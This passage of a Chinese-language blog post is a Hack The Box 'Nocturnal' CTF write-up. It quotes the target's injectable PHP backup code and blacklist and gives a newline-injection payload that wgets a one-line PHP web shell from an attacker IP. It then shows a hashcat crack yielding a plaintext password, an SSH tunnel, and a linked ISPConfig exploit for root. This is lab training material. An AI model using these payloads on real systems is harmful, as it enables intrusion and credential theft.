</span>&#123;</span><br><span class="line">    <span class="variable">$blacklist_chars</span> = [<span class="string">&#x27;;&#x27;</span>, <span class="string">&#x27;&amp;&#x27;</span>, <span class="string">&#x27;|&#x27;</span>, <span class="string">&#x27;$&#x27;</span>, <span class="string">&#x27; &#x27;</span>, <span class="string">&#x27;`&#x27;</span>, <span class="string">&#x27;&#123;&#x27;</span>, <span class="string">&#x27;&#125;&#x27;</span>, <span class="string">&#x27;&amp;&amp;&#x27;</span>];</span><br><span class="line"></span><br><span class="line">    <span class="keyword">foreach</span> (<span class="variable">$blacklist_chars</span> <span class="keyword">as</span> <span class="variable">$char</span>) &#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="title function_ invoke__">strpos</span>(<span class="variable">$entry</span>, <span class="variable">$char</span>) !== <span class="literal">false</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">false</span>; <span class="comment">// Malicious input detected</span></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="title function_ invoke__">htmlspecialchars</span>(<span class="variable">$entry</span>, ENT_QUOTES, <span class="string">&#x27;UTF-8&#x27;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;backup&#x27;</span>]) &amp;&amp; !<span class="keyword">empty</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;password&#x27;</span>])) &#123;</span><br><span class="line">    <span class="variable">$password</span> = <span class="title function_ invoke__">cleanEntry</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;password&#x27;</span>]);</span><br><span class="line">    <span class="variable">$backupFile</span> = <span class="string">&quot;backups/backup_&quot;</span> . <span class="title function_ invoke__">date</span>(<span class="string">&#x27;Y-m-d&#x27;</span>) . <span class="string">&quot;.zip&quot;</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (<span class="variable">$password</span> === <span class="literal">false</span>) &#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;&lt;div class=&#x27;error-message&#x27;&gt;Error: Try another password.&lt;/div&gt;&quot;</span>;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="variable">$logFile</span> = <span class="string">&#x27;/tmp/backup_&#x27;</span> . <span class="title function_ invoke__">uniqid</span>() . <span class="string">&#x27;.log&#x27;</span>;</span><br><span class="line">       </span><br><span class="line">        <span class="variable">$command</span> = <span class="string">&quot;zip -x &#x27;./backups/*&#x27; -r -P &quot;</span> . <span class="variable">$password</span> . <span class="string">&quot; &quot;</span> . <span class="variable">$backupFile</span> . <span class="string">&quot; .  &gt; &quot;</span> . <span class="variable">$logFile</span> . <span class="string">&quot; 2&gt;&amp;1 &amp;&quot;</span>;</span><br><span class="line">        </span><br><span class="line">        <span class="variable">$descriptor_spec</span> = [</span><br><span class="line">            <span class="number">0</span> =&gt; [<span class="string">&quot;pipe&quot;</span>, <span class="string">&quot;r&quot;</span>], <span class="comment">// stdin</span></span><br><span class="line">            <span class="number">1</span> =&gt; [<span class="string">&quot;file&quot;</span>, <span class="variable">$logFile</span>, <span class="string">&quot;w&quot;</span>], <span class="comment">// stdout</span></span><br><span class="line">            <span class="number">2</span> =&gt; [<span class="string">&quot;file&quot;</span>, <span class="variable">$logFile</span>, <span class="string">&quot;w&quot;</span>], <span class="comment">// stderr</span></span><br><span class="line">        ];</span><br><span class="line"></span><br><span class="line">        <span class="variable">$process</span> = <span class="title function_ invoke__">proc_open</span>(<span class="variable">$command</span>, <span class="variable">$descriptor_spec</span>, <span class="variable">$pipes</span>);</span><br><span class="line">        <span class="keyword">if</span> (<span class="title function_ invoke__">is_resource</span>(<span class="variable">$process</span>)) &#123;</span><br><span class="line">            <span class="title function_ invoke__">proc_close</span>(<span class="variable">$process</span>);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="title function_ invoke__">sleep</span>(<span class="number">2</span>);</span><br><span class="line"></span><br><span class="line">        <span class="variable">$logContents</span> = <span class="title function_ invoke__">file_get_contents</span>(<span class="variable">$logFile</span>);</span><br><span class="line">        <span class="keyword">if</span> (<span class="title function_ invoke__">strpos</span>(<span class="variable">$logContents</span>, <span class="string">&#x27;zip error&#x27;</span>) === <span class="literal">false</span>) &#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;&lt;div class=&#x27;backup-success&#x27;&gt;&quot;</span>;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;&lt;p&gt;Backup created successfully.&lt;/p&gt;&quot;</span>;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;&lt;a href=&#x27;&quot;</span> . <span class="title function_ invoke__">htmlspecialchars</span>(<span class="variable">$backupFile</span>) . <span class="string">&quot;&#x27; class=&#x27;download-button&#x27; download&gt;Download Backup&lt;/a&gt;&quot;</span>;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;&lt;h3&gt;Output:&lt;/h3&gt;&lt;pre&gt;&quot;</span> . <span class="title function_ invoke__">htmlspecialchars</span>(<span class="variable">$logContents</span>) . <span class="string">&quot;&lt;/pre&gt;&quot;</span>;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;&lt;/div&gt;&quot;</span>;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;&lt;div class=&#x27;error-message&#x27;&gt;Error creating the backup.&lt;/div&gt;&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="title function_ invoke__">unlink</span>(<span class="variable">$logFile</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>入口：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$command</span> = <span class="string">&quot;zip -x &#x27;./backups/*&#x27; -r -P &quot;</span> . <span class="variable">$password</span> . <span class="string">&quot; &quot;</span> . <span class="variable">$backupFile</span> . <span class="string">&quot; .  &gt; &quot;</span> . <span class="variable">$logFile</span> . <span class="string">&quot; 2&gt;&amp;1 &amp;&quot;</span>;</span><br></pre></td></tr></table></figure>
+
+
+
+<p>命令注入的黑名单部分</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">cleanEntry</span>(<span class="params"><span class="variable">$entry</span></span>) </span>&#123;</span><br><span class="line">    <span class="variable">$blacklist_chars</span> = [<span class="string">&#x27;;&#x27;</span>, <span class="string">&#x27;&amp;&#x27;</span>, <span class="string">&#x27;|&#x27;</span>, <span class="string">&#x27;$&#x27;</span>, <span class="string">&#x27; &#x27;</span>, <span class="string">&#x27;`&#x27;</span>, <span class="string">&#x27;&#123;&#x27;</span>, <span class="string">&#x27;&#125;&#x27;</span>, <span class="string">&#x27;&amp;&amp;&#x27;</span>];</span><br><span class="line"></span><br><span class="line">    <span class="keyword">foreach</span> (<span class="variable">$blacklist_chars</span> <span class="keyword">as</span> <span class="variable">$char</span>) &#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="title function_ invoke__">strpos</span>(<span class="variable">$entry</span>, <span class="variable">$char</span>) !== <span class="literal">false</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">false</span>; <span class="comment">// Malicious input detected</span></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="title function_ invoke__">htmlspecialchars</span>(<span class="variable">$entry</span>, ENT_QUOTES, <span class="string">&#x27;UTF-8&#x27;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p>尝试了strpos函数的绕过方法，但是没法绕过强比较类型，所以尝试其他方法</p>
+<p>最后通过查询相关网页（<del>偷看秘籍</del>），发现可以通过换行符，以及特殊字符绕过</p>
+<p><strong>以下是可以绕过空格的字符集，在此记录一下</strong></p>
+<blockquote>
+<p>&lt;,&lt;&gt;,%20(space),%09(tab),$IFS$9, I F S , {IFS},IFS,IFS<br>————————————————</p>
+<pre><code>                       版权声明：本文为博主原创文章，遵循 CC 4.0 BY-SA 版权协议，转载请附上原文出处链接和本声明。
+</code></pre>
+<p>原文链接：<a target="_blank" rel="noopener" href="https://blog.csdn.net/qq_45655564/article/details/117395152">https://blog.csdn.net/qq_45655564/article/details/117395152</a></p>
+</blockquote>
+<p>过滤了分号、&amp;、｜等常见的命令拼接方式可以尝试使用%0A换行符进行命令拼接</p>
+<p>最后的payload：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"># http://nocturnal.htb/admin.php</span><br><span class="line"># </span><br><span class="line">password=%0Abash%09-c%09&quot;wget%0910.10.16.21:81/s.php&quot;%0A&amp;backup=</span><br><span class="line"></span><br><span class="line"># s.php</span><br><span class="line">&lt;?php echo `$_REQUEST[1]`; ?&gt;</span><br></pre></td></tr></table></figure>
+
+<p>查询到上层目录中存在db文件，下载下来查看到存在用户密码哈希值，可以爆破也可以在网站上在线破解。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br></pre></td><td class="code"><pre><span class="line">➜  nocturnal hashcat -m 0 -a 0 &#x27;55c82b1ccd55ab219b3b109b07d5061d&#x27; /Users/r3tr0/hack/KaliLists/rockyou.txt </span><br><span class="line">hashcat (v6.2.6) starting</span><br><span class="line"></span><br><span class="line">* Device #2: Apple&#x27;s OpenCL drivers (GPU) are known to be unreliable.</span><br><span class="line">             You have been warned.</span><br><span class="line"></span><br><span class="line">METAL API (Metal 343.19)</span><br><span class="line">========================</span><br><span class="line">* Device #1: Apple M2, 5408/10922 MB, 8MCU</span><br><span class="line"></span><br><span class="line">OpenCL API (OpenCL 1.2 (Apr 13 2024 11:09:23)) - Platform #1 [Apple]</span><br><span class="line">====================================================================</span><br><span class="line">* Device #2: Apple M2, skipped</span><br><span class="line"></span><br><span class="line">Minimum password length supported by kernel: 0</span><br><span class="line">Maximum password length supported by kernel: 256</span><br><span class="line"></span><br><span class="line">Hashes: 1 digests; 1 unique digests, 1 unique salts</span><br><span class="line">Bitmaps: 16 bits, 65536 entries, 0x0000ffff mask, 262144 bytes, 5/13 rotates</span><br><span class="line">Rules: 1</span><br><span class="line"></span><br><span class="line">Optimizers applied:</span><br><span class="line">* Zero-Byte</span><br><span class="line">* Early-Skip</span><br><span class="line">* Not-Salted</span><br><span class="line">* Not-Iterated</span><br><span class="line">* Single-Hash</span><br><span class="line">* Single-Salt</span><br><span class="line">* Raw-Hash</span><br><span class="line"></span><br><span class="line">ATTENTION! Pure (unoptimized) backend kernels selected.</span><br><span class="line">Pure kernels can crack longer passwords, but drastically reduce performance.</span><br><span class="line">If you want to switch to optimized kernels, append -O to your commandline.</span><br><span class="line">See the above message to find out about the exact limits.</span><br><span class="line"></span><br><span class="line">Watchdog: Temperature abort trigger set to 100c</span><br><span class="line"></span><br><span class="line">Host memory required for this attack: 140 MB</span><br><span class="line"></span><br><span class="line">Dictionary cache built:</span><br><span class="line">* Filename..: /Users/r3tr0/hack/KaliLists/rockyou.txt</span><br><span class="line">* Passwords.: 14344392</span><br><span class="line">* Bytes.....: 139921507</span><br><span class="line">* Keyspace..: 14344385</span><br><span class="line">* Runtime...: 0 secs</span><br><span class="line"></span><br><span class="line">55c82b1ccd55ab219b3b109b07d5061d:slowmotionapocalypse     </span><br><span class="line">                                                          </span><br><span class="line">Session..........: hashcat</span><br><span class="line">Status...........: Cracked</span><br><span class="line">Hash.Mode........: 0 (MD5)</span><br><span class="line">Hash.Target......: 55c82b1ccd55ab219b3b109b07d5061d</span><br><span class="line">Time.Started.....: Mon Apr 21 10:07:09 2025 (1 sec)</span><br><span class="line">Time.Estimated...: Mon Apr 21 10:07:10 2025 (0 secs)</span><br><span class="line">Kernel.Feature...: Pure Kernel</span><br><span class="line">Guess.Base.......: File (/Users/r3tr0/hack/KaliLists/rockyou.txt)</span><br><span class="line">Guess.Queue......: 1/1 (100.00%)</span><br><span class="line">Speed.#1.........: 24388.6 kH/s (5.23ms) @ Accel:1024 Loops:1 Thr:64 Vec:1</span><br><span class="line">Recovered........: 1/1 (100.00%) Digests (total), 1/1 (100.00%) Digests (new)</span><br><span class="line">Progress.........: 4194304/14344385 (29.24%)</span><br><span class="line">Rejected.........: 0/4194304 (0.00%)</span><br><span class="line">Restore.Point....: 3670016/14344385 (25.59%)</span><br><span class="line">Restore.Sub.#1...: Salt:0 Amplifier:0-1 Iteration:0-1</span><br><span class="line">Candidate.Engine.: Device Generator</span><br><span class="line">Candidates.#1....: sn781225 -&gt; rogans</span><br><span class="line">Hardware.Mon.#1..: Util: 40%</span><br><span class="line"></span><br><span class="line">Started: Mon Apr 21 10:07:03 2025</span><br><span class="line">Stopped: Mon Apr 21 10:07:11 2025</span><br></pre></td></tr></table></figure>
+
+<p>得到用户登录凭证55c82b1ccd55ab219b3b109b07d5061d:slowmotionapocalypse  ，ssh登录</p>
+<h2 id="Root"><a href="#Root" class="headerlink" title="Root"></a>Root</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">tobias@nocturnal:~$ netstat -antpl</span><br><span class="line">(Not all processes could be identified, non-owned process info</span><br><span class="line"> will not be shown, you would have to be root to see it all.)</span><br><span class="line">Active Internet connections (servers and established)</span><br><span class="line">Proto Recv-Q Send-Q Local Address           Foreign Address         State       PID/Program name    </span><br><span class="line">tcp        0      0 127.0.0.1:33060         0.0.0.0:*               LISTEN      -                   </span><br><span class="line">tcp        0      0 127.0.0.1:3306          0.0.0.0:*               LISTEN      -                   </span><br><span class="line">tcp        0      0 127.0.0.1:587           0.0.0.0:*               LISTEN      -                   </span><br><span class="line">tcp        0      0 127.0.0.1:8080          0.0.0.0:*               LISTEN      -                   </span><br><span class="line">tcp        0      0 0.0.0.0:80              0.0.0.0:*               LISTEN      -                   </span><br><span class="line">tcp        0      0 127.0.0.53:53           0.0.0.0:*               LISTEN      -                   </span><br><span class="line">tcp        0      0 0.0.0.0:22              0.0.0.0:*               LISTEN      -                   </span><br><span class="line">tcp        0      0 127.0.0.1:25            0.0.0.0:*               LISTEN      -                   </span><br><span class="line">tcp        0      0 10.10.11.64:80          10.10.16.5:45398        FIN_WAIT2   -                   </span><br><span class="line">tcp        0      0 127.0.0.1:8080          127.0.0.1:55550         TIME_WAIT   -                   </span><br><span class="line">tcp        0      0 127.0.0.1:8080          127.0.0.1:39964         TIME_WAIT   -                   </span><br><span class="line">tcp        0      0 10.10.11.64:22          10.10.16.21:63137       ESTABLISHED -                   </span><br><span class="line">tcp        0    360 10.10.11.64:22          10.10.16.21:65192       ESTABLISHED -                   </span><br><span class="line">tcp        0      0 10.10.11.64:80          10.10.16.5:58146        FIN_WAIT2   -                   </span><br><span class="line">tcp        0      0 10.10.11.64:80          10.10.16.5:60798        FIN_WAIT2   -                   </span><br><span class="line">tcp        0      0 127.0.0.1:8080          127.0.0.1:60292         TIME_WAIT   -                   </span><br><span class="line">tcp        0      0 10.10.11.64:80          10.10.16.5:59680        FIN_WAIT2   -                   </span><br><span class="line">tcp        0      0 10.10.11.64:22          10.10.16.22:64081       ESTABLISHED -                   </span><br><span class="line">tcp6       0      0 :::22                   :::*                    LISTEN      -</span><br></pre></td></tr></table></figure>
+
+<p>发现内网开启了8080的服务，代理出来看一波</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ssh tobias@nocturnal.htb -L 9090:127.0.0.1:8080</span><br></pre></td></tr></table></figure>
+
+<p>也可以用chisel等工具实现</p>
+<p>发现是<strong>ispconfig</strong>的网站，刚好存在漏洞：<a target="_blank" rel="noopener" href="https://sploitus.com/exploit?id=C8C641AC-8810-5B1B-878E-D064A44248BB">https://sploitus.com/exploit?id=C8C641AC-8810-5B1B-878E-D064A44248BB</a></p>
+<p>密码同样是user的密码，用户是admin，拿到root权限</p>
+
+    </div>
+
+    
+    
+    
+        
+
+<div>
+<ul class="post-copyright">
+  <li class="post-copyright-author">
+    <strong>Post author:  </strong>r3tr0
+  </li>
+  <li class="post-copyright-link">
+    <strong>Post link: </strong>
+    <a href="http://r3tr0y.github.io/2025/04/14/HTB-nocturnal/" title="HTB-nocturnal">http://r3tr0y.github.io/2025/04/14/HTB-nocturnal/</a>
+  </li>
+  <li class="post-copyright-license">
+    <strong>Copyright Notice:  </strong>All articles in this blog are licensed under <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" rel="noopener" target="_blank"><i class="fab fa-fw fa-creative-commons"></i>BY-NC-SA</a> unless stating additionally.
+  </li>
+</ul>
+</div>
+
+
+      <footer class="post-footer">
+          <div class="post-tags">
+              <a href="/tags/ctf/" rel="tag"># ctf</a>
+              <a href="/tags/HTB/" rel="tag"># HTB</a>
+          </div>
+
+        
+
+
+        
+    <div class="post-nav">
+      <div class="post-nav-item">
+    <a href="/2025/04/14/%E3%80%90%E5%8F%96%E8%AF%81%E3%80%91%E6%9C%8D%E5%8A%A1%E5%99%A8%E5%8F%96%E8%AF%81%E5%9F%BA%E7%A1%80%E5%91%BD%E4%BB%A4/" rel="prev" title="【取证】服务器取证基础命令">
+      <i class="fa fa-chevron-left"></i> 【取证】服务器取证基础命令
+    </a></div>
+      <div class="post-nav-item">
+    <a href="/2025/04/24/%E3%80%90%E5%8F%96%E8%AF%81%E3%80%91%E7%A8%8B%E5%BA%8F%E9%80%86%E5%90%91%E5%88%86%E6%9E%90%E7%9B%B8%E5%85%B3/" rel="next" title="【取证】程序逆向分析相关">
+      【取证】程序逆向分析相关 <i class="fa fa-chevron-right"></i>
+    </a></div>
+    </div>
+      </footer>
+    
+  </article>
+  
+  
+  
+
+
+
+          </div>
+          
+
+<script>
+  window.addEventListener('tabs:register', () => {
+    let { activeClass } = CONFIG.comments;
+    if (CONFIG.comments.storage) {
+      activeClass = localStorage.getItem('comments_active') || activeClass;
+    }
+    if (activeClass) {
+      let activeTab = document.querySelector(`a[href="#comment-${activeClass}"]`);
+      if (activeTab) {
+        activeTab.click();
+      }
+    }
+  });
+  if (CONFIG.comments.storage) {
+    window.addEventListener('tabs:click', event => {
+      if (!event.target.matches('.tabs-comment .tab-content .tab-pane')) return;
+      let commentClass = event.target.classList[1];
+      localStorage.setItem('comments_active', commentClass);
+    });
+  }
+</script>
+
+        </div>
+          
+  
+  <div class="toggle sidebar-toggle">
+    <span class="toggle-line toggle-line-first"></span>
+    <span class="toggle-line toggle-line-middle"></span>
+    <span class="toggle-line toggle-line-last"></span>
+  </div>
+
+  <aside class="sidebar">
+    <div class="sidebar-inner">
+
+      <ul class="sidebar-nav motion-element">
+        <li class="sidebar-nav-toc">
+          Table of Contents
+        </li>
+        <li class="sidebar-nav-overview">
+          Overview
+        </li>
+      </ul>
+
+      <!--noindex-->
+      <div class="post-toc-wrap sidebar-panel">
+          <div class="post-toc motion-element"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#HTB-nocturnal"><span class="nav-number">1.</span> <span class="nav-text">HTB-nocturnal</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#User"><span class="nav-number">1.1.</span> <span class="nav-text">User</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Root"><span class="nav-number">1.2.</span> <span class="nav-text">Root</span></a></li></ol></li></ol></div>
+      </div>
+      <!--/noindex-->
+
+      <div class="site-overview-wrap sidebar-panel">
+        <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+  <p class="site-author-name" itemprop="name">r3tr0</p>
+  <div class="site-description" itemprop="description"></div>
+</div>
+<div class="site-state-wrap motion-element">
+  <nav class="site-state">
+      <div class="site-state-item site-state-posts">
+          <a href="/archives/">
+        
+          <span class="site-state-item-count">23</span>
+          <span class="site-state-item-name">posts</span>
+        </a>
+      </div>
+      <div class="site-state-item site-state-categories">
+            <a href="/categories/">
+          
+        <span class="site-state-item-count">4</span>
+        <span class="site-state-item-name">categories</span></a>
+      </div>
+      <div class="site-state-item site-state-tags">
+            <a href="/tags/">
+          
+        <span class="site-state-item-count">4</span>
+        <span class="site-state-item-name">tags</span></a>
+      </div>
+  </nav>
+</div>
+  <div class="cc-license motion-element" itemprop="license">
+    <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" class="cc-opacity" rel="noopener" target="_blank"><img src="/images/cc-by-nc-sa.svg" alt="Creative Commons"></a>
+  </div>
+
+
+
+      </div>
+
+    </div>
+  </aside>
+  <div id="sidebar-dimmer"></div>
+
+
+      </div>
+    </main>
+
+    <footer class="footer">
+      <div class="footer-inner">
+        
+
+        
+
+<div class="copyright">
+  
+  &copy; 
+  <span itemprop="copyrightYear">2026</span>
+  <span class="with-love">
+    <i class="fa fa-heart"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">r3tr0</span>
+    <span class="post-meta-divider">|</span>
+    <span class="post-meta-item-icon">
+      <i class="fa fa-chart-area"></i>
+    </span>
+    <span title="Symbols count total">103k</span>
+    <span class="post-meta-divider">|</span>
+    <span class="post-meta-item-icon">
+      <i class="fa fa-coffee"></i>
+    </span>
+    <span title="Reading time total">1:33</span>
+</div>
+  <div class="powered-by">Powered by <a href="https://hexo.io/" class="theme-link" rel="noopener" target="_blank">Hexo</a> & <a href="https://pisces.theme-next.org/" class="theme-link" rel="noopener" target="_blank">NexT.Pisces</a>
+  </div>
+
+        
+<div class="busuanzi-count">
+  <script async src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+    <span class="post-meta-item" id="busuanzi_container_site_uv" style="display: none;">
+      <span class="post-meta-item-icon">
+        <i class="fa fa-user"></i>
+      </span>
+      <span class="site-uv" title="Total Visitors">
+        <span id="busuanzi_value_site_uv"></span>
+      </span>
+    </span>
+    <span class="post-meta-divider">|</span>
+    <span class="post-meta-item" id="busuanzi_container_site_pv" style="display: none;">
+      <span class="post-meta-item-icon">
+        <i class="fa fa-eye"></i>
+      </span>
+      <span class="site-pv" title="Total Views">
+        <span id="busuanzi_value_site_pv"></span>
+      </span>
+    </span>
+</div>
+
+
+
+
+
+
+
+
+      </div>
+    </footer>
+  </div>
+
+  
+  <script src="/lib/anime.min.js"></script>
+  <script src="/lib/velocity/velocity.min.js"></script>
+  <script src="/lib/velocity/velocity.ui.min.js"></script>
+
+<script src="/js/utils.js"></script>
+
+<script src="/js/motion.js"></script>
+
+
+<script src="/js/schemes/pisces.js"></script>
+
+
+<script src="/js/next-boot.js"></script>
+
+
+
+
+  
+
+
+
+
+  
+<script src="/js/local-search.js"></script>
+
+
+
+
+
+
+
+
+
+
+
+<script>
+if (document.querySelectorAll('pre.mermaid').length) {
+  NexT.utils.getScript('//cdn.jsdelivr.net/npm/mermaid@8/dist/mermaid.min.js', () => {
+    mermaid.initialize({
+      theme    : 'forest',
+      logLevel : 3,
+      flowchart: { curve     : 'linear' },
+      gantt    : { axisFormat: '%m/%d/%Y' },
+      sequence : { actorMargin: 50 }
+    });
+  }, window.mermaid);
+}
+</script>
+
+
+  
+
+  
+
+</body>
+</html>
